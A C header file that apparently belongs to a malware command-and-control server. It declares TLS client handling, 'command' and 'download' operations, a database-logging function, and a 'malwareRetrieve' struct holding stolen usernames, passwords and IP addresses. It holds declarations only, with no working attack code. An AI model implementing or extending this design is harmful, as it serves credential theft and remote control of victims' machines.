#ifndef SERVER_H
#define SERVER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


// CONSTANTS
// ---------------------

#define API_COMMAND "command"
#define DOWNLOAD_COMMAND "download"
#define CHUNK_SIZE 1024


// GLOBAL VARIABLES
// ---------------------

extern struct sockaddr_in addr;
extern struct sockaddr_in client_addr;


// STRUCT DEFINITIONS
// ---------------------

typedef struct context {
    int fd;
    SSL_CTX *ctx;
} context;

typedef struct infoclient {
    int client;
    char ip[16];
    SSL *ssl;
} infoclient;

typedef struct malwareRetrieve {
    char username[64];
    char password[64];
    char ipaddr[16];
} malwareRetrieve;


// FUNCTION DECLARATIONS
// ---------------------

void printLog(char *msg, ...);
void *handleClient(void *arg);
void *ListenToClient(void *arg);
void sendToDatabase(const char *message);


#endif
